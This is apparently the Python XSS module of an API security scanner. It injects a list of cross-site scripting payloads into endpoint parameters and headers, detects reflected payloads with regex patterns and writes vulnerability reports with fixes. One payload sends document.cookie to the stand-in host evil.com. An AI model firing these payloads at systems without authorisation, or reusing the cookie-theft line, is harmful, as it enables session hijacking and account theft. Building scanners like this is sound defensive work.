"""
XSS (Cross-Site Scripting) attack module.

Tests API endpoints for XSS vulnerabilities by injecting malicious scripts
in parameters, headers, and request bodies.
"""

import time
import re
from typing import Any, Optional
import requests

from ..models import (
    AttackType,
    AttackResult,
    Endpoint,
    Parameter,
    Severity,
    Vulnerability,
    XSSResult
)


class XSSAttacker:
    """Performs XSS attacks on API endpoints."""
    
    # Basic XSS payloads
    BASIC_PAYLOADS = [
        # Script tags
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<script>document.location='http://evil.com/?c='+document.cookie</script>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        
        # Event handlers
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        
        # JavaScript URLs
        "javascript:alert('XSS')",
        "javascript:alert(1)",
        "JaVaScRiPt:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
        
        # Encoded payloads
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        
        # Polyglot payloads
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    ]
    
    # API-specific XSS payloads (for JSON responses)
    API_PAYLOADS = [
        {"test": "<script>alert('XSS')</script>"},
        {"test": "javascript:alert(1)"},
        {"test": {"nested": "<img src=x onerror=alert(1)>"}},
    ]
    
    # Patterns that indicate successful XSS
    XSS_INDICATORS = [
        r"<script[^>]*>.*?</script>",
        r"onerror\s*=",
        r"onload\s*=",
        r"onclick\s*=",
        r"onmouseover\s*=",
        r"javascript:",
        r"alert\s*\(",
        r"document\.cookie",
        r"document\.location",
    ]
    
    # Context detection patterns
    CONTEXT_PATTERNS = {
        "html": [r"<[^>]*>.*?</[^>]*>", r"<[^>]*/>"],
        "attribute": [r"=\"[^\"]*\"", r"='[^']*'"],
        "script": [r"<script[^>]*>", r"var\s+", r"let\s+", r"const\s+"],
        "json": [r"\{.*\}", r"\[.*\]"],
    }
    
    def __init__(self, target_url: str, timeout: int = 5):
        """Initialize the XSS attacker.
        
        Args:
            target_url: Base URL of the target API
            timeout: Request timeout in seconds
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Sentinel/2.0.0 Security Scanner',
            'Accept': 'application/json, text/html, */*',
            'Content-Type': 'application/json'
        })
    
    def attack(self, endpoint: Endpoint, parameters_to_test: Optional[list[str]] = None) -> list[AttackResult]:
        """Perform XSS attacks on an endpoint.
        
        Args:
            endpoint: The endpoint to attack
            parameters_to_test: Specific parameter names to test
            
        Returns:
            List of attack results
        """
        results: list[AttackResult] = []
        
        # Get testable parameters
        params_to_test = self._get_testable_parameters(endpoint, parameters_to_test)
        
        for param in params_to_test:
            # Test basic payloads
            for payload in self.BASIC_PAYLOADS[:10]:  # Limit to first 10 for speed
                result = self._test_payload(endpoint, param, payload)
                results.append(result)
                
                if result.success:
                    # Found vulnerability, test a few more to confirm
                    break
        
        # Test headers for XSS
        header_results = self._test_header_xss(endpoint)
        results.extend(header_results)
        
        return results
    
    def _get_testable_parameters(
        self, 
        endpoint: Endpoint, 
        parameters_to_test: Optional[list[str]]
    ) -> list[Parameter]:
        """Get list of parameters that should be tested for XSS."""
        params = []
        
        for param in endpoint.parameters:
            if parameters_to_test and param.name not in parameters_to_test:
                continue
            
            # XSS typically works with string parameters
            if param.param_type in ('string', None) or param.location in ('query', 'body', 'path'):
                params.append(param)
        
        # Also test request body if present
        if endpoint.request_body:
            body_params = self._extract_body_parameters(endpoint.request_body)
            for param_name in body_params:
                params.append(Parameter(
                    name=param_name,
                    location='body',
                    param_type='string'
                ))
        
        return params
    
    def _extract_body_parameters(self, request_body: dict) -> list[str]:
        """Extract parameter names from request body schema."""
        params = []
        
        content = request_body.get('content', {})
        for content_type, content_schema in content.items():
            if 'application/json' in content_type:
                schema = content_schema.get('schema', {})
                properties = schema.get('properties', {})
                params.extend(properties.keys())
        
        return params
    
    def _test_payload(self, endpoint: Endpoint, param: Parameter, payload: str) -> AttackResult:
        """Test a single XSS payload."""
        start_time = time.time()
        
        try:
            url = self._build_url(endpoint.path)
            
            # Build request based on method and parameter location
            if endpoint.method.value == 'GET':
                params = {param.name: payload}
                response = self.session.get(
                    url,
                    params=params,
                    timeout=self.timeout,
                    allow_redirects=False
                )
            else:
                # For POST/PUT/PATCH, inject in body
                body = {param.name: payload}
                response = self.session.request(
                    endpoint.method.value,
                    url,
                    json=body,
                    timeout=self.timeout,
                    allow_redirects=False
                )
            
            duration_ms = (time.time() - start_time) * 1000
            
            # Check for XSS vulnerability
            is_vulnerable, context = self._check_xss_vulnerability(response, payload)
            
            result = AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.XSS,
                success=is_vulnerable,
                payload=payload,
                response_status=response.status_code,
                response_body=response.text[:500],
                duration_ms=duration_ms,
                extra_data={'xss_context': context} if context else None
            )
            
            return result
            
        except requests.exceptions.Timeout:
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.XSS,
                success=False,
                payload=payload,
                error_message="Request timed out"
            )
        except Exception as e:
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.XSS,
                success=False,
                payload=payload,
                error_message=str(e)
            )
    
    def _test_header_xss(self, endpoint: Endpoint) -> list[AttackResult]:
        """Test XSS in HTTP headers."""
        results = []
        
        # Headers that might reflect XSS
        test_headers = [
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Custom-Header',
            'Referer',
            'User-Agent',
        ]
        
        payload = "<script>alert('XSS')</script>"
        
        for header in test_headers:
            start_time = time.time()
            
            try:
                url = self._build_url(endpoint.path)
                headers = {header: payload}
                
                response = self.session.request(
                    endpoint.method.value,
                    url,
                    headers=headers,
                    timeout=self.timeout
                )
                
                duration_ms = (time.time() - start_time) * 1000
                is_vulnerable, context = self._check_xss_vulnerability(response, payload)
                
                results.append(AttackResult(
                    endpoint=endpoint,
                    attack_type=AttackType.XSS,
                    success=is_vulnerable,
                    payload=f"Header: {header}={payload}",
                    response_status=response.status_code,
                    response_body=response.text[:500],
                    duration_ms=duration_ms
                ))
                
            except Exception:
                pass
        
        return results
    
    def _build_url(self, path: str) -> str:
        """Build full URL from path."""
        return f"{self.target_url}{path}"
    
    def _check_xss_vulnerability(self, response: requests.Response, payload: str) -> tuple[bool, Optional[str]]:
        """Check if response indicates XSS vulnerability.
        
        Returns:
            Tuple of (is_vulnerable, context)
        """
        response_text = response.text
        
        # Check if payload is reflected in response
        if payload.lower() not in response_text.lower():
            # Check for partial reflection or encoding
            payload_parts = payload.replace('<', '').replace('>', '').replace("'", '').replace('"', '').split()
            reflected_count = sum(1 for part in payload_parts if part.lower() in response_text.lower())
            if reflected_count < len(payload_parts) / 2:
                return False, None
        
        # Detect the context
        context = self._detect_context(response_text, payload)
        
        # Check if dangerous patterns are present (not sanitized)
        for pattern in self.XSS_INDICATORS:
            if re.search(pattern, response_text, re.IGNORECASE):
                # Verify it's our payload, not existing content
                if payload.lower() in response_text.lower():
                    return True, context
        
        # Check if payload is reflected without proper encoding
        if payload in response_text:
            return True, context
        
        # Check for HTML entity encoding bypass
        if any(encoded in response_text for encoded in ['&#60;', '&#x3C;', '%3C', '&lt;']):
            # Payload might be encoded but still vulnerable in some contexts
            if context == 'attribute' or context == 'url':
                return True, context
        
        return False, None
    
    def _detect_context(self, response_text: str, payload: str) -> str:
        """Detect the context where payload appears."""
        # Find payload position
        payload_lower = payload.lower()
        response_lower = response_text.lower()
        
        try:
            pos = response_lower.index(payload_lower)
        except ValueError:
            return "unknown"
        
        # Check surrounding context
        before = response_text[:pos]
        after = response_text[pos + len(payload):]
        
        # Check for different contexts
        if re.search(r'<script[^>]*>', before[-100:] if before else ''):
            return "script"
        
        if re.search(r'=\s*["\']?$', before[-50:] if before else ''):
            return "attribute"
        
        if re.search(r'<[^>]*>', before[-50:] if before else ''):
            return "html"
        
        if re.search(r'href\s*=\s*["\']?$', before[-50:] if before else ''):
            return "url"
        
        return "html"
    
    def create_vulnerability(self, result: AttackResult, endpoint: Endpoint) -> Vulnerability:
        """Create a Vulnerability object from an attack result."""
        context = result.extra_data.get('xss_context', 'unknown') if result.extra_data else 'unknown'
        
        return Vulnerability(
            endpoint=endpoint,
            attack_type=AttackType.XSS,
            severity=Severity.HIGH,
            title=f"Cross-Site Scripting (XSS) in {endpoint.full_path}",
            description=(
                f"Cross-Site Scripting (XSS) vulnerability detected in {context} context. "
                f"An attacker can inject malicious scripts that will be executed in the context "
                f"of other users' browsers. This can lead to session hijacking, credential theft, "
                f"malware distribution, and other attacks."
            ),
            payload=result.payload or "",
            proof_of_concept=(
                f"Request: {endpoint.method.value} {endpoint.path}\n"
                f"Payload: {result.payload}\n"
                f"Context: {context}\n"
                f"Response Status: {result.response_status}\n"
                f"The payload was reflected in the response without proper sanitization."
            ),
            recommendation=(
                "1. Encode all user-supplied data before rendering in HTML\n"
                "2. Implement Content Security Policy (CSP) headers\n"
                "3. Use HTTPOnly and Secure flags on cookies\n"
                "4. Implement input validation and allowlists\n"
                "5. Use modern frameworks that auto-escape output\n"
                "6. Set X-XSS-Protection header (deprecated but still useful)"
            ),
            cwe_id="CWE-79",
            owasp_category="A03:2021 - Injection",
            response_evidence=result.response_body,
            cvss_score=7.5,
            references=[
                "https://owasp.org/www-community/attacks/xss/",
                "https://portswigger.net/web-security/cross-site-scripting"
            ]
        )
